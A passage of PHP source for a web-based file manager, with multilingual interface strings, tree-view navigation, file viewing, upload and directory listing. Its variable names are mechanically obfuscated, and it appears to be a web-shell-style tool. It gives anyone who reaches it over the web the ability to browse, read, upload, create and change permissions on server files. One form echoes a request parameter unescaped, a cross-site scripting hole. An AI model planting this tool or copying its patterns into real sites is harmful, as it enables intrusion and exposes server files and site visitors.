'nastaven&#xED;'; $sp6b23c0['yes'] = 'ano'; $sp6b23c0['no'] = 'ne'; $sp6b23c0['back'] = 'zp&#xE1;tky'; $sp6b23c0['setperms'] = 'nastav pr&#xE1;va'; $sp6b23c0['readingerror'] = 'Chyba p&#x0159;i &#x010D;ten&#xED; 1'; $sp6b23c0['permsset'] = 'P&#x0159;&#xED;stupov&#xE1; pr&#xE1;va k 1 byla nastavena na 2.'; $sp6b23c0['permsnotset'] = 'P&#x0159;&#xED;stupov&#xE1; pr&#xE1;va k 1 nelze  nastavit na 2.'; $sp6b23c0['uploaded'] = 'Soubor 1 byl ulo&#x017E;en do adres&#xE1;&#x0159;e 2.'; $sp6b23c0['notuploaded'] = 'Chyba p&#x0159;i ukl&#xE1;d&#xE1;n&#xED; souboru 1 do adres&#xE1;&#x0159;e 2.'; $sp6b23c0['moved'] = 'Soubor 1 byl p&#x0159;esunut do adres&#xE1;&#x0159;e 2.'; $sp6b23c0['notmoved'] = 'Soubor 1 nelze p&#x0159;esunout do adres&#xE1;&#x0159;e 2.'; $sp6b23c0['copied'] = 'Soubor 1 byl zkop&#xED;rov&#xE1;n do adres&#xE1;&#x0159;e 2.'; $sp6b23c0['notcopied'] = 'Soubor 1 nelze zkop&#xED;rovat do adres&#xE1;&#x0159;e 2.'; $sp6b23c0['created'] = '1 byl vytvo&#x0159;en.'; $sp6b23c0['notcreated'] = '1 nelze vytvo&#x0159;it.'; $sp6b23c0['deleted'] = '1 byl vymaz&#xE1;n.'; $sp6b23c0['notdeleted'] = '1 nelze vymazat.'; $sp6b23c0['suredelete'] = 'Skute&#x010D;n&#x011B; smazat 1?'; $sp6b23c0['saved'] = 'Soubor 1 byl ulo&#x017E;en.'; $sp6b23c0['notsaved'] = 'Soubor 1 nelze ulo&#x017E;it.'; $sp6b23c0['reset'] = 'zp&#x011B;t'; $sp6b23c0['clear'] = 'vy&#x010D;istit'; $sp6b23c0['save'] = 'ulo&#x017E;'; $sp6b23c0['cantbeshown'] = '1 can\'t be shown.'; $sp6b23c0['sourceof'] = 'source of 1'; $sp6b23c0['notopened'] = '1 nelze otev&#x0159;&#xED;t'; $sp6b23c0['addauth'] = 'p&#x0159;idat z&#xE1;kladn&#xED;-authentifikaci'; $sp6b23c0['username'] = 'U&#x017E;ivatelsk&#xE9; jm&#xE9;no'; $sp6b23c0['password'] = 'Heslo'; $sp6b23c0['add'] = 'p&#x0159;idat'; $sp6b23c0['treeon'] = 'Zobraz strom adres&#xE1;&#x0159;&#x016F;'; $sp6b23c0['treeoff'] = 'Skryj strom adres&#xE1;&#x0159;&#x016F;'; $sp6b23c0['symlink'] = 'Symbolick&#xFD; odkaz'; $sp6b23c0['createsymlink'] = 'vytvo&#x0159;it odkaz'; $sp6b23c0['target'] = 'C&#xED;l'; $sp6b23c0['reltarget'] = 'Relativni cesta k c&#xED;li'; $sp6b23c0['alreadyexists'] = 'Tento soubor u&#x017E; existuje.'; $sp6b23c0['overwrite'] = 'P&#x0159;epsat 1?'; $sp6b23c0['samefiles'] = '1 a 2 jsou identick&#xE9;l.'; break; case 'it': $sp6b23c0['dir'] = 'Directory'; $sp6b23c0['file'] = 'File'; $sp6b23c0['filename'] = 'Nome file'; $sp6b23c0['size'] = 'Dimensioni'; $sp6b23c0['permission'] = 'Permessi'; $sp6b23c0['functions'] = 'Funzioni'; $sp6b23c0['owner'] = 'Proprietario'; $sp6b23c0['group'] = 'Gruppo'; $sp6b23c0['other'] = 'Altro'; $sp6b23c0['create'] = 'crea'; $sp6b23c0['copy'] = 'copia'; $sp6b23c0['copyto'] = 'copia su'; $sp6b23c0['move'] = 'muovi'; $sp6b23c0['moveto'] = 'muove su'; $sp6b23c0['delete'] = 'delete'; $sp6b23c0['edit'] = 'edit'; $sp6b23c0['read'] = 'leggi'; $sp6b23c0['write'] = 'scrivi'; $sp6b23c0['exec'] = 'esegui'; $sp6b23c0['change'] = 'modifica'; $sp6b23c0['upload'] = 'upload'; $sp6b23c0['configure'] = 'configura'; $sp6b23c0['yes'] = 'si'; $sp6b23c0['no'] = 'no'; $sp6b23c0['back'] = 'back'; $sp6b23c0['setperms'] = 'imposta permessi'; $sp6b23c0['readingerror'] = 'Errore durante la lettura di 1'; $sp6b23c0['permsset'] = 'I permessi di 1 sono stati impostati a 2.'; $sp6b23c0['permsnotset'] = 'I permessi di 1 non possono essere impostati.'; $sp6b23c0['uploaded'] = '1 è stato uploadato su 2.'; $sp6b23c0['notuploaded'] = 'Errore durante l\'upload di 1 su 2.'; $sp6b23c0['moved'] = '1 è stato spostato su 2.'; $sp6b23c0['notmoved'] = '1 non può essere spostato su 2.'; $sp6b23c0['copied'] = '1 è stato copiato su 2.'; $sp6b23c0['notcopied'] = '1 non può essere copiato su 2.'; $sp6b23c0['created'] = '1 è stato creato.'; $sp6b23c0['notcreated'] = 'impossibile creare 1.'; $sp6b23c0['deleted'] = '1 è stato eliminato.'; $sp6b23c0['notdeleted'] = 'Impossibile eliminare 1.'; $sp6b23c0['suredelete'] = 'Confermi eliminazione di 1?'; $sp6b23c0['saved'] = '1 è stato salvato.'; $sp6b23c0['notsaved'] = 'Impossibile salvare 1.'; $sp6b23c0['reset'] = 'reimposta'; $sp6b23c0['clear'] = 'pulisci'; $sp6b23c0['save'] = 'salva'; $sp6b23c0['cantbeshown'] = 'Impossibile visualizzare 1.'; $sp6b23c0['sourceof'] = 'sorgente di 1'; $sp6b23c0['notopened'] = 'Impossibile aprire 1'; $sp6b23c0['addauth'] = 'aggiunge autenticazione di base'; $sp6b23c0['username'] = 'Nome Utente'; $sp6b23c0['password'] = 'Password'; $sp6b23c0['add'] = 'add'; $sp6b23c0['treeon'] = 'Abilita vista ad albero'; $sp6b23c0['treeoff'] = 'Disabilita vista ad albero'; $sp6b23c0['symlink'] = 'Link simbolico'; $sp6b23c0['createsymlink'] = 'crea symlink'; $sp6b23c0['target'] = 'Target'; $sp6b23c0['reltarget'] = 'Percorso relativo al target'; $sp6b23c0['alreadyexists'] = 'Questo file esiste già.'; $sp6b23c0['overwrite'] = 'Sovrascrivi 1?'; $sp6b23c0['samefiles'] = '1 e 2 sono identici.'; break; case 'en': default: $sp6b23c0['dir'] = 'Directory'; $sp6b23c0['file'] = 'File'; $sp6b23c0['filename'] = 'Filename'; $sp6b23c0['size'] = 'Size'; $sp6b23c0['permission'] = 'Permission'; $sp6b23c0['functions'] = 'Functions'; $sp6b23c0['owner'] = 'Owner'; $sp6b23c0['group'] = 'Group'; $sp6b23c0['other'] = 'Other'; $sp6b23c0['create'] = 'create'; $sp6b23c0['copy'] = 'copy'; $sp6b23c0['copyto'] = 'copy to'; $sp6b23c0['move'] = 'move'; $sp6b23c0['moveto'] = 'move to'; $sp6b23c0['delete'] = 'delete'; $sp6b23c0['edit'] = 'edit'; $sp6b23c0['read'] = 'read'; $sp6b23c0['write'] = 'write'; $sp6b23c0['exec'] = 'execute'; $sp6b23c0['change'] = 'change'; $sp6b23c0['upload'] = 'upload'; $sp6b23c0['configure'] = 'configure'; $sp6b23c0['yes'] = 'yes'; $sp6b23c0['no'] = 'no'; $sp6b23c0['back'] = 'back'; $sp6b23c0['setperms'] = 'set permission'; $sp6b23c0['readingerror'] = 'Error during read of 1'; $sp6b23c0['permsset'] = 'The permission of 1 were set to 2.'; $sp6b23c0['permsnotset'] = 'The permission of 1 could not be set.'; $sp6b23c0['uploaded'] = '1 has been uploaded to 2.'; $sp6b23c0['notuploaded'] = 'Error during upload of 1 to 2.'; $sp6b23c0['moved'] = '1 has been moved to 2.'; $sp6b23c0['notmoved'] = '1 could not be moved to 2.'; $sp6b23c0['copied'] = '1 has been copied to 2.'; $sp6b23c0['notcopied'] = '1 could not be copied to 2.'; $sp6b23c0['created'] = '1 has been created.'; $sp6b23c0['notcreated'] = '1 could not be created.'; $sp6b23c0['deleted'] = '1 has been deleted.'; $sp6b23c0['notdeleted'] = '1 could not be deleted.'; $sp6b23c0['suredelete'] = 'Really delete 1?'; $sp6b23c0['saved'] = '1 has been saved.'; $sp6b23c0['notsaved'] = '1 could not be saved.'; $sp6b23c0['reset'] = 'reset'; $sp6b23c0['clear'] = 'clear'; $sp6b23c0['save'] = 'save'; $sp6b23c0['cantbeshown'] = '1 can\'t be shown.'; $sp6b23c0['sourceof'] = 'source of 1'; $sp6b23c0['notopened'] = '1 couldn\'t be opened'; $sp6b23c0['addauth'] = 'add basic-authentification'; $sp6b23c0['username'] = 'Username'; $sp6b23c0['password'] = 'Password'; $sp6b23c0['add'] = 'add'; $sp6b23c0['treeon'] = 'Enable treeview'; $sp6b23c0['treeoff'] = 'Disable treeview'; $sp6b23c0['symlink'] = 'Symbolic link'; $sp6b23c0['createsymlink'] = 'create link'; $sp6b23c0['target'] = 'Target'; $sp6b23c0['reltarget'] = 'Relative path to target'; $sp6b23c0['alreadyexists'] = 'This file already exists.'; $sp6b23c0['overwrite'] = 'Overwrite 1?'; $sp6b23c0['samefiles'] = '1 and 2 are identical.'; } return $sp6b23c0; } function getimage($sp438f59) { $sp7a4506 = 'GIF89a'; switch ($sp438f59) { case 1: $sp7a4506 .= '  ¢    ÿÿÿÌÌÌ™™™ÿÿÿ         !ùè ,       ?HºÜN Ê×@¸P%»Ÿ‹…¤ q ®¬:œPÚÎo(Ïlâ­ó9˜¸ò‰crÀl:™0Ègº©Z¯Øl5 ; '; break; case 2: $sp7a4506 .= '  ‘    ÌÌÌÿÿÿ   !ùè ,       4”©í›@˜@#©vïdV^HfrêÊ˜ehIß;Å3}6ô†îõè3!VÄÓåˆL*— ; '; break; case 3: $sp7a4506 .= '  € ™™™ÿÿÿ!ùè ,       Œo€Ëí­žœ,Ò+-ÞKóï}[(^d9hP  ; '; break; case 4: $sp7a4506 .= '  ‘ ™™™ÿÿÿ   ÿÿÿ!ùè ,       .œ©Ëí˜”:²àj¡u–™È`ÂºrC‡d`ºãzÛyUU
‡DF ; '; break; case 5: $sp7a4506 .= '  ‘ ™™™ÿÿÿ   ÿÿÿ!ùè ,       *œ©Ëí˜”:²ànÝ5ØÇyÂy–]ˆŒ»¸¬ÈàUUÑÎ÷þÏ(  ; '; break; case 6: $sp7a4506 .= '  € ™™™ÿÿÿ!ùè ,       Œo€Ëí­žœ,Ò+-ÞKùðq”&rd‰è¸> ; '; break; case 7: $sp7a4506 .= '  ‘ ™™™ÿÿÿ   ÿÿÿ!ùè ,       0œo€Ëí­žœ	Øk%¼‡èlœÐPGr&³	®ûÊ*£¥f«¸§?ØO	†„Äa‘R  ; '; break; case 8: $sp7a4506 .= '  ‘ ™™™ÿÿÿ   ÿÿÿ!ùè ,       /œo€Ëí­žœ	Øk%¼‡èlB#©Âº~ƒR&§ûˆc¼ØŽ`>‡B"¥  ; '; break; case 9: $sp7a4506 .= '  € ™™™ÿÿÿ!ùè ,       Œo€Ëí­žœ,Ò+-ÞKùðqâH–æ‰r ; '; break; case 10: $sp7a4506 .= '  ‘ ™™™ÿÿÿ   ÿÿÿ!ùè ,       /œo€Ëí­žœ	Øk%¼‡èlœÐPGr&³	®ûÊ*£¥f«¸§?ØO	
‡Ä¢°  ; '; break; case 11: $sp7a4506 .= '  ‘ ™™™ÿÿÿ   ÿÿÿ!ùè ,       .œo€Ëí­žœ	Øk%¼‡èlB#©Âº~ƒR&§ûˆc¼ØŽ`>
‡Ä` ; '; break; case 12: $sp7a4506 .= '  ‘ ™™™ÿÿÿ   ÿÿÿ!ùè ,       -œ‰Æãjì‰+ÂôD™t†iâ‡rÔHfªƒ~o´—¹ÆÒi»§Žs(†¯ ; '; break; case 13: $sp7a4506 .= '  ‘ Ì  ÿÿÿ™™™ÿÿÿ!ùè ,       -œ‰Æãjì‰+ÂôD™t†iâ‡rÔHfªƒ~o´—¹ÆÒi»§Žs(†¯ ; '; break; case 14: $sp7a4506 .= '  ¢ ™™™ÿÿÿ   Ì  ÿÿÿ         !ùè ,       9H
Ü¬0‚@ë‹pŠ-ÂØRYM8Åy&…Ž,„Îs°Å
M 6/[§\'¦`ÄÌˆ3lÁ,&‡”˜  ; '; break; case 15: $sp7a4506 .= '  ‘ ™™™ÿÿÿÌÌÌÿÿÿ!ùè ,       *œ™À¬bÏ´‹•¼: @–&	Šçúmì™ŽoÏ´k·aŽÙo(  ; '; break; case 16: $sp7a4506 .= '  ‘    ÿÿ ÿÿÿ   !ùè ,       ,”©í°³Ò5ƒÞ¦6_ÕP¥x”‡JävziwJfâ2‚³ú	 ; '; break; case 0: default: $sp7a4506 .= '  €    ÿÿÿ!ùè ,       Œ©Ëí£œ´Ú‹³Þ¼× ; '; break; } return $sp7a4506; } function tree_hassubdirs($sp49de29) { if ($sp0992ce = @opendir($sp49de29)) { while (($spbc6552 = readdir($sp0992ce)) !== FALSE) { if (tree_isrealdir($sp49de29 . $spbc6552)) { return TRUE; } } } return FALSE; } function tree_isrealdir($sp49de29) { if (basename($sp49de29) != '.' && basename($sp49de29) != '..' && @is_dir($sp49de29) && !@is_link($sp49de29)) { return TRUE; } else { return FALSE; } } function treeview() { global $spa5bde5, $sp64a3ad; if (isset($_GET['plus'])) { tree_plus($_SESSION['tree'], $_SESSION['hassubdirs'], $_GET['plus']); } if (isset($_GET['minus'])) { $spad4f0d = tree_minus($_SESSION['tree'], $_SESSION['hassubdirs'], $_GET['minus']); } else { $spad4f0d = FALSE; } for ($sp6bf0a4 = $_SESSION['dir']; strlen($sp6bf0a4 = dirname($sp6bf0a4)) != 1; tree_plus($_SESSION['tree'], $_SESSION['hassubdirs'], $sp6bf0a4)) { } ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2//EN">
<html>
<head>
	<title>Treeview</title>
	<style type="text/css">
	<!--
		td { font-family: sans-serif; font-size: 10pt; }
		a:link, a:visited, a:active { text-decoration: none; color: #000088; }
		a:hover { text-decoration: underline; color: #000088; }
	-->
	</style>
</head>
<body bgcolor="#FFFFFF"<?php  if ($spad4f0d) { echo " '{$spa5bde5}?noupdate=TRUE&dir=" . urlencode($_SESSION['dir']) . '&' . SID . '&pmru=' . time() . '\'))"'; } ?>
>
	<table border="0" cellspacing="0" cellpadding="0">
<?php  tree_showtree($_SESSION['tree'], $_SESSION['hassubdirs'], $sp64a3ad, 0, tree_calculatenumcols($_SESSION['tree'], $sp64a3ad, 0)); ?>
	</table>
</body>
</html>
<?php  return; } function frameset() { global $spa5bde5; ?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Frameset//EN">
<html>
<head>
	<title><?php  echo $spa5bde5; ?>
</title>
</head>
<frameset cols="250,*">
	<frame src="<?php  echo "{$spa5bde5}?frame=treeview&" . SID . '#' . urlencode($_SESSION['dir']); ?>
" name="treeview">
	<frame src="<?php  echo "{$spa5bde5}?" . SID; ?>
" name="webadmin">
</frameset>
</html>
<?php  return; } function tree_calculatenumcols($spe4b7ba, $sp49de29, $sp1126d7) { static $spa1d991 = 0; if ($sp1126d7 > $spa1d991) { $spa1d991 = $sp1126d7; } if (isset($spe4b7ba[$sp49de29])) { for ($sp6c3e91 = 0; $sp6c3e91 < sizeof($spe4b7ba[$sp49de29]); $sp6c3e91++) { $spa1d991 = tree_calculatenumcols($spe4b7ba, $sp49de29 . $spe4b7ba[$sp49de29][$sp6c3e91], $sp1126d7 + 1); } } return $spa1d991; } function tree_showtree($spe4b7ba, $speb92c7, $sp49de29, $sp1126d7, $spa1d991) { global $spa5bde5, $sp64a3ad; static $spaa8c69 = array(0 => TRUE); echo '	<tr>
'; for ($sp6c3e91 = 0; $sp6c3e91 < $sp1126d7; $sp6c3e91++) { if ($spaa8c69[$sp6c3e91]) { $sp438f59 = 0; } else { $sp438f59 = 3; } echo "\t\t<td><img src=\"{$spa5bde5}?imageid={$sp438f59}\" width=\"19\" height=\"18\"></td>\n"; } if ($speb92c7[$sp49de29]) { if (!empty($spe4b7ba[$sp49de29])) { $spd2ab61 = 'minus'; $sp438f59 = 8; } else { $spd2ab61 = 'plus'; $sp438f59 = 7; } if ($sp1126d7 == 0) { $sp438f59 -= 3; } else { if ($spaa8c69[$sp1126d7]) { $sp438f59 += 3; } } echo "\t\t<td><a href=\"{$spa5bde5}?frame=treeview&{$spd2ab61}=" . urlencode($sp49de29) . '&dir=' . urlencode($_SESSION['dir']) . '&' . SID . '#' . urlencode($sp49de29) . '">'; echo "<img src=\"{$spa5bde5}?imageid={$sp438f59}\" width=\"19\" height=\"18\" border=\"0\">"; echo '</a></td>
'; } else { if ($spaa8c69[$sp1126d7]) { $sp438f59 = 9; } else { $sp438f59 = 6; } echo "\t\t<td><img src=\"{$spa5bde5}?imageid={$sp438f59}\" width=\"19\" height=\"18\"></td>\n"; } if (@is_readable($sp49de29)) { $sp733f74 = '<a name="' . urlencode($sp49de29) . "\" href=\"{$spa5bde5}?dir=" . urlencode($sp49de29) . '&' . SID . '" target="webadmin">'; $spfd8897 = '</a>'; } else { $sp733f74 = $spfd8897 = ''; } if ($_SESSION['dir'] == $sp49de29) { $sp438f59 = 2; } else { $sp438f59 = 1; } echo "\t\t<td>{$sp733f74}<img src=\"{$spa5bde5}?imageid={$sp438f59}\" width=\"19\" height=\"18\" border=\"0\">{$spfd8897}</td>\n"; $sp506bba = $spa1d991 - $sp1126d7 + 1; if ($sp506bba > 1) { $spdea646 = " colspan=\"{$sp506bba}\""; } else { $spdea646 = ''; } if ($sp1126d7 == $spa1d991) { $sp110ff9 = ' width="100%"'; } else { $sp110ff9 = ''; } echo "\t\t<td{$sp110ff9}{$spdea646} nowrap>&nbsp;"; if ($sp49de29 == $sp64a3ad) { $sp3c5e70 = $sp49de29; } else { $sp3c5e70 = basename($sp49de29); } echo $sp733f74 . htmlentities($sp3c5e70) . $spfd8897; echo '</td>
'; echo '	</tr>
'; if (!empty($spe4b7ba[$sp49de29])) { for ($sp6c3e91 = 0; $sp6c3e91 < sizeof($spe4b7ba[$sp49de29]); $sp6c3e91++) { if ($sp6c3e91 + 1 == sizeof($spe4b7ba[$sp49de29])) { $spaa8c69[$sp1126d7 + 1] = TRUE; } else { $spaa8c69[$sp1126d7 + 1] = FALSE; } tree_showtree($spe4b7ba, $speb92c7, $sp49de29 . $spe4b7ba[$sp49de29][$sp6c3e91], $sp1126d7 + 1, $spa1d991); } } return; } function tree_plus(&$spe4b7ba, &$speb92c7, $sp0992ce) { if ($sp49de29 = spath(realpath($sp0992ce))) { $spe4b7ba[$sp49de29] = tree_getsubdirs($sp49de29); for ($sp6c3e91 = 0; $sp6c3e91 < sizeof($spe4b7ba[$sp49de29]); $sp6c3e91++) { $sp7ba12f = $sp49de29 . $spe4b7ba[$sp49de29][$sp6c3e91]; if (empty($speb92c7[$sp7ba12f])) { $speb92c7[$sp7ba12f] = tree_hassubdirs($sp7ba12f); } } } return; } function tree_minus(&$spe4b7ba, &$speb92c7, $sp0992ce) { $spad4f0d = FALSE; if ($sp49de29 = spath(realpath($sp0992ce))) { if (!empty($spe4b7ba[$sp49de29])) { for ($sp6c3e91 = 0; $sp6c3e91 < sizeof($spe4b7ba[$sp49de29]); $sp6c3e91++) { $sp7ba12f = $sp49de29 . $spe4b7ba[$sp49de29][$sp6c3e91] . '/'; if (isset($speb92c7[$sp7ba12f])) { $speb92c7[$sp7ba12f] = NULL; } } $spe4b7ba[$sp49de29] = NULL; if (substr($_SESSION['dir'], 0, strlen($sp49de29)) == $sp49de29) { $_SESSION['dir'] = $sp49de29; $spad4f0d = TRUE; } } } return $spad4f0d; } function tree_getsubdirs($sp49de29) { $sp5a8d61 = array(); if ($sp0992ce = @opendir($sp49de29)) { for ($sp6c3e91 = 0; ($spbc6552 = readdir($sp0992ce)) !== FALSE;) { if (tree_isrealdir($sp49de29 . $spbc6552)) { $sp5a8d61[$sp6c3e91++] = $spbc6552 . '/'; } } } sort($sp5a8d61); return $sp5a8d61; } function show($spa3ecf0) { global $sp6b23c0; if (@is_readable($spa3ecf0) && @is_file($spa3ecf0)) { header('Content-Disposition: filename=' . basename($spa3ecf0)); header('Content-Type: ' . getmimetype($spa3ecf0)); if (@readfile($spa3ecf0) !== FALSE) { return TRUE; } } return FALSE; } function show_highlight($spa3ecf0) { global $sp6b23c0; if (@is_readable($spa3ecf0) && @is_file($spa3ecf0)) { header('Content-Disposition: filename=' . basename($spa3ecf0)); echo '<html>
<head><title>'; echo buildphrase(array('&quot;' . htmlentities(basename($spa3ecf0)) . '&quot;'), $sp6b23c0['sourceof']); echo '</title></head>
<body>
<table cellpadding="4" border="0">
<tr>
<td>
<code style="color: #999999">
'; $sp92ea66 = sizeof(file($spa3ecf0)); for ($sp6c3e91 = 1; $sp6c3e91 <= $sp92ea66; $sp6c3e91++) { printf('%05d<br>
', $sp6c3e91); } echo '</code>
</td>
<td nowrap>
'; $spd2a480 = @highlight_file($spa3ecf0); echo '
'; echo '</td>
</tr>
</table>
'; echo '</body>
'; echo '</html>'; if ($spd2a480) { return TRUE; } } return FALSE; } function getmimetype($spa3ecf0) { $sp219a9a = 'text/plain'; $spe7e244 = substr($spa3ecf0, strrpos($spa3ecf0, '.') + 1); if (@is_readable('/etc/mime.types')) { $sp224638 = fopen('/etc/mime.types', 'r'); while (!feof($sp224638)) { $sp91b79a = fgets($sp224638, 4096); $sp16bd78 = FALSE; $sp3f38f8 = strtok($sp91b79a, ' 
	'); $sp4ce699 = strtok(' 
	'); while ($sp4ce699 && !$sp16bd78) { if (strtolower($sp4ce699) == strtolower($spe7e244)) { $sp16bd78 = TRUE; $sp219a9a = $sp3f38f8; break; } $sp4ce699 = strtok(' 
	'); } if ($sp16bd78) { break; } } fclose($sp224638); } return $sp219a9a; } function dirlisting($sp81dfea = FALSE) { global $spa5bde5, $spc6d893, $sp6b23c0; global $spf785f6, $spdfbf8e; $sp0992ce = '&' . SID; html_header($_SESSION['dir']); ?>
	<form action="<?php  echo $spa5bde5; ?>
" method="get">
	<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEEE" align="center"><b><?php  echo htmlentities($_SERVER['SERVER_NAME']); ?>
</b></td>
		<td bgcolor="#EEEEEE" align="center"><?php  echo htmlentities($_SERVER['SERVER_SOFTWARE']); ?>
</td>
	</tr>
	<tr>
		<td bgcolor="#EEEEEE" colspan="2">
			<table border="0" cellspacing="0" cellpadding="0">
			<tr>
				<td><?php  echo "<a href=\"{$spa5bde5}?dir=" . urlencode($spc6d893) . "{$sp0992ce}\">" . $sp6b23c0['dir']; ?>
</a>:&nbsp;</td>
				<td><input type="text" name="dir" value="<?php  echo htmlentities($_SESSION['dir']); ?>
" size="<?php  echo textfieldsize($_SESSION['dir']); ?>
">&nbsp;</td>
				<td><input type="submit" value="<?php  echo $sp6b23c0['change']; ?>
"></td>
			</tr>
			</table>
		</td>
	</tr>
	</table>
	</td></tr></table>
	</form>
<?php  if (@is_writable($_SESSION['dir'])) { ?>
	<form action="<?php  echo $spa5bde5; ?>
" method="post" enctype="multipart/form-data">
	<input type="hidden" name="dir" value="<?php  echo htmlentities($_SESSION['dir']); ?>
">
	<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
<?php  if (isset($_REQUEST['frame'])) { ?>
	<input type="hidden" name="frame" value="<?php  echo $_REQUEST['frame']; ?>
">
<?php  } ?>
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
	<tr>
		<td bgcolor="#EEEEEE">
			<table border="0" cellspacing="0" cellpadding="0">
			<tr>
				<td><?php  echo $sp6b23c0['file']; ?>
&nbsp;</td>
				<td><input type="file" name="upload">&nbsp;</td>
				<td><input type="submit" value="<?php  echo $sp6b23c0['upload']; ?>
"></td>
			</tr>
			</table>
		</td>
	</tr>
	<tr>
		<td bgcolor="#EEEEEE">
			</form>
			<form action="<?php  echo $spa5bde5; ?>
" method="get">
			<input type="hidden" name="dir" value="<?php  echo htmlentities($_SESSION['dir']); ?>
">
			<input type="hidden" name="id" value="<?php  echo session_id(); ?>
">
<?php  if (isset($_REQUEST['frame'])) { ?>
			<input type="hidden" name="frame" value="<?php  echo $_REQUEST['frame']; ?>
">
<?php  } ?>
			<table border="0" cellspacing="0" cellpadding="0">
			<tr>
				<td>
					<select name="type" size="1">
					<option value="file"><?php  echo $sp6b23c0['file']; ?>

					<option value="dir" selected><?php  echo $sp6b23c0['dir']; ?>

					</select>&nbsp;
				</td>
				<td><input type="text" name="create">&nbsp;</td>
				<td><input type="submit" value="<?php  echo $sp6b23c0['create']; ?>
"></td>
			</tr>
			</table>
		</td>
	</tr>
	</table>
	</td></tr></table>
	</form>
<?php  } if (empty($_GET['sort'])) { $sp946414 = 'filename'; } else { $sp946414 = $_GET['sort']; } $sp685417 = @$_GET['reverse']; $sp64e32a['showsize'] = FALSE; if ($sp9f4c7d = dirtoarray($_SESSION['dir'])) { $sp9f4c7d = sortfiles($sp9f4c7d, $sp946414, $sp685417); outputdirlisting($_SESSION['dir'], $sp9f4c7d, $sp81dfea, $sp946414, $sp685417); } else { perror(buildphrase('&quot;<b>' . htmlentities($_SESSION['dir']) . '</b>&quot', $sp6b23c0['readingerror'])); } if ($sp81dfea) { pnotice("<a href=\"{$spa5bde5}?action=treeoff&" . SID . '" target="_top">' . $sp6b23c0['treeoff'] . '</a>'); } else { pnotice("<a href=\"{$spa5bde5}?action=treeon&" . SID . '" target="_top">' . $sp6b23c0['treeon'] . '</a>'); } html_footer(FALSE); return; } function dirtoarray($spa25e24) { if ($sp711532 = @opendir($spa25e24)) { for ($sp9728ca = 0; ($spbc6552 = readdir($sp711532)) !== FALSE; $sp9728ca++) { $spb5bb2c = @lstat($spa25e24 . $spbc6552); $sp9f4c7d[$sp9728ca]['filename'] = $spbc6552; $sp9f4c7d[$sp9728ca]['fullfilename'] = $sp153e85 = relpathtoabspath($spbc6552, $spa25e24); $sp9f4c7d[$sp9728ca]['is_file'] = @is_file($sp153e85); $sp9f4c7d[$sp9728ca]['is_dir'] = @is_dir($sp153e85); $sp9f4c7d[$sp9728ca]['is_link'] = $sp67d390 = @is_link($spa25e24 . $spbc6552); if ($sp67d390) { $sp9f4c7d[$sp9728ca]['readlink'] = @readlink($spa25e24 . $spbc6552); $sp9f4c7d[$sp9728ca]['linkinfo'] = linkinfo($spa25e24 . $spbc6552); } $sp9f4c7d[$sp9728ca]['is_readable'] = @is_readable($sp153e85); $sp9f4c7d[$sp9728ca]['is_writable'] = @is_writable($sp153e85); $sp9f4c7d[$sp9728ca]['is_executable'] = @is_executable($sp153e85); $sp9f4c7d[$sp9728ca]['permission'] = $sp67d390 ? 'lrwxrwxrwx' : octtostr(@fileperms($spa25e24 . $spbc6552)); if (substr($sp9f4c7d[$sp9728ca]['permission'], 0, 1) != '-') { $sp9f4c7d[$sp9728ca]['size'] = -1; } else { $sp9f4c7d[$sp9728ca]['size'] = @$spb5bb2c['size']; $sp64e32a['showsize'] = TRUE; } $sp9f4c7d[$sp9728ca]['owner'] = $sp0581a1 = @$spb5bb2c['uid']; $sp9f4c7d[$sp9728ca]['group'] = $spbaefbe = @$spb5bb2c['gid']; $sp9f4c7d[$sp9728ca]['ownername'] = @reset(posix_getpwuid($sp0581a1)); $sp9f4c7d[$sp9728ca]['groupname'] = @reset(posix_getgrgid($spbaefbe)); } closedir($sp711532); return $sp9f4c7d; } else { return FALSE; } } function outputdirlisting($spa25e24, $sp9f4c7d, $sp81dfea, $sp946414, $sp685417) { global $spa5bde5, $sp6b23c0; $spca6b76 = posix_getuid(); ?>
	<p>
	<table border="0" cellspacing="0" cellpadding="0"><tr><td bgcolor="#888888">
	<table border="0" cellspacing="1" cellpadding="4">
<?php  if ($sp81dfea) { $sp0992ce = '&notreeupdate=TRUE&'; } $sp0992ce = ''; $sp0992ce .= SID . '&dir=' . urlencode($spa25e24); echo '	<tr>
'; echo "\t\t<td bgcolor=\"#EEEEEE\"><img src=\"{$spa5bde5}?imageid=16\" width=\"17\" height=\"13\"></td>\n"; echo "\t\t<td bgcolor=\"#EEEEEE\"><a href=\"{$spa5bde5}?sort=filename&reverse=" . ($sp946414 == 'filename' ? !$sp685417 : 0) . "&{$sp0992ce}\"><b>{$sp6b23c0['filename']}</b></a></td>\n"; if ($sp64e32a['showsize']) { echo "\t\t<td bgcolor=\"#EEEEEE\" align=\"right\"><a href=\"{$spa5bde5}?sort=size&reverse=" . ($sp946414 == 'size' ? !$sp685417 : 0) . "&{$sp0992ce}\"><b>{$sp6b23c0['size']}</b></a></td>\n"; } echo "\t\t<td bgcolor=\"#EEEEEE\"><a href=\"{$spa5bde5}?sort=permission&reverse=" . ($sp946414 == 'permission' ? !$sp685417 : 0) . "&{$sp0992ce}\"><b>{$sp6b23c0['permission']}</b></a></td>\n"; echo "\t\t<td bgcolor=\"#EEEEEE\"><a href=\"{$spa5bde5}?sort=owner&reverse=" . ($sp946414 == 'owner' ? !$sp685417 : 0) . "&{$sp0992ce}\"><b>{$sp6b23c0['owner']}</b></a></td>\n"; echo "\t\t<td bgcolor=\"#EEEEEE\"><a href=\"{$spa5bde5}?sort=group&reverse=" . ($sp946414 == 'group' ? !$sp685417 : 0) . "&{$sp0992ce}\"><b>{$sp6b23c0['group']}</b></a></td>\n"; echo "\t\t<td bgcolor=\"#EEEEEE\"><b>{$sp6b23c0['functions']}</b></td>\n"; echo '	</tr>
'; $sp0992ce = '&' . SID; if ($sp64e32a['showsize']) { $sp506bba = ' colspan="2"'; } else { $sp506bba = ''; } foreach ($sp9f4c7d as $spa3ecf0) { echo '	<tr>
